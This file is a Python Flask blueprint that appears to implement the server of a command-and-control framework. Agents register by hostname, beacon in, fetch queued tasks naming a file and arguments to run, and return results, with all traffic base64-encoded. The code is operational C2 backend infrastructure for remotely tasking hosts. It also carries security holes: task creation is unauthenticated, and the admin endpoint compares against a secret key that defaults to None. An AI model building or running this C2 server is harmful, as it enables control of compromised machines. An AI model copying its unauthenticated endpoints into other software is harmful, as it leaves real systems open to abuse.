from flask import Blueprint
from flask import request
from base64 import urlsafe_b64encode as base64encode, urlsafe_b64decode as base64decode
import json

from .console import Color

from .database import *

# API Service
service = Blueprint("service", __name__, url_prefix="/service")

serviceConf: dict = {
    "online": True,
    "logging": False,
    "secret_key": None
}

@service.route("/", methods = {"GET"})
def status():
    if serviceConf["online"]:
        return base64encode("online".encode()).decode()
    else:
        return base64encode("offline".encode()).decode()

@service.route("/bind", methods = {"POST"})
def bind():
    jdata: dict = json.loads(base64decode(request.data).decode())

    if not "hostname" in jdata.keys():
        return base64encode("FAILED".encode()).decode()
    hostname: str = jdata["hostname"]

    if Agent.exists(hostname=hostname):
        Agent.update_beacon(hostname)
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Checked in Agent: {hostname}"+Color.Reset)
    else:
        newAgent = Agent(hostname=hostname)
        db.session.add(newAgent)
        db.session.commit()
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Added new Agent: {hostname}"+Color.Reset)

    return base64encode("OK".encode()).decode()

@service.route("/task", methods = {"GET", "POST", "DELETE"})
def task():
    jdata: dict = json.loads(base64decode(request.data).decode())

    if not "hostname" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No hostname was given!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()
    hostname: str = jdata["hostname"]

    if not Agent.exists(hostname=hostname):
        if serviceConf: print(f":: {Color.Red}✘{Color.White} Invalid hostname!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()

    if request.method == "POST":
        if not "task" in jdata.keys():
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No task was given!"+Color.Reset)
            return base64encode("FAILED".encode()).decode()
        jtask = jdata["task"]
        keys = jtask.keys()
    
        if not "file" in keys or not "args" in keys or not "verbose" in keys:
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No file, args or verbose atribute for task was given!"+Color.Reset)
            return base64encode("FAILED".encode()).decode()
        file: str = jtask["file"]
        args: list[str] = json.dumps(jtask["args"])
        verbose: bool = jtask["verbose"]

        agent_id = Agent.get_by_hostname(hostname).id
        newTask = Task(file=file, args=args, verbose=verbose, agent_id=agent_id)
        db.session.add(newTask)
        db.session.commit()

        if serviceConf: print(f":: {Color.Green}✔{Color.White} Added new Task for Agent: {hostname}"+Color.Reset)

        return base64encode(str(newTask.id).encode()).decode()
    else:
        Agent.update_beacon(hostname)
        if serviceConf: print(f":: {Color.Green}✔{Color.White} Geting next Task for Agent: {hostname}"+Color.Reset)
        task = Agent.get_nextTask(hostname)
        if task != None:
            return base64encode(task.jsonify().encode()).decode()
        return base64encode("NONE".encode()).decode()

@service.route("/reply", methods = {"POST", "GET"})
def reply():
    jdata: dict = json.loads(base64decode(request.data).decode())

    if not "hostname" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No hostname was given!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()
    hostname: str = jdata["hostname"]

    if not Agent.exists(hostname=hostname):
        if serviceConf: print(f":: {Color.Red}✘{Color.White} Invalid hostname!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()
    Agent.update_beacon(hostname)

    if not "task_id" in jdata.keys():
        if serviceConf: print(f":: {Color.Red}✘{Color.White} No task_id was given!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()
    task_id: str = jdata["task_id"]

    if request.method == "POST":
        Agent.update_beacon(hostname)
        if not "content" in jdata.keys():
            if serviceConf: print(f":: {Color.Red}✘{Color.White} No content was given!"+Color.Reset)
            return base64encode("FAILED".encode()).decode()
        content: str = jdata["content"]

        if serviceConf: print(f":: {Color.Green}✔{Color.White} Setting reply for Task: {task_id}"+Color.Reset)
        Task.get_by_id(task_id).set_reply(content)

        return base64encode("OK".encode()).decode()
    else:
        task = Task.get_by_id(task_id)
        if task is None:
            return base64encode("NONE".encode()).decode()
        else:
            if serviceConf: print(f":: {Color.Green}✔{Color.White} Getting reply of Task: {task_id}"+Color.Reset)
            return base64encode(task.get_reply().encode()).decode()

@service.route("/agents", methods = {"DELETE", "GET"})
def deleteAll():
    if request.headers.get("key") == serviceConf["secret_key"]:
        if request.method == "DELETE":
            Agent.delete_all()
            if serviceConf["logging"]: print(f":: {Color.Magenta}✔{Color.White} Deleted all Agents!"+Color.Reset)
            return base64encode("DELETED AGENTS".encode()).decode()
        else:
            agents = Agent.query.all()
            if agents is None:
                return base64encode("NONE".encode()).decode()

            dict_repr = dict()
            for agent in agents:
                dict_repr[str(agent.id)] = {
                    "hostname": agent.hostname,
                    "beacon": agent.beacon
                }
            return base64encode(json.dumps(dict_repr).encode()).decode()
    else:
        if serviceConf["logging"]: print(f":: {Color.Blue}✘{Color.White} Invalid key!"+Color.Reset)
        return base64encode("FAILED".encode()).decode()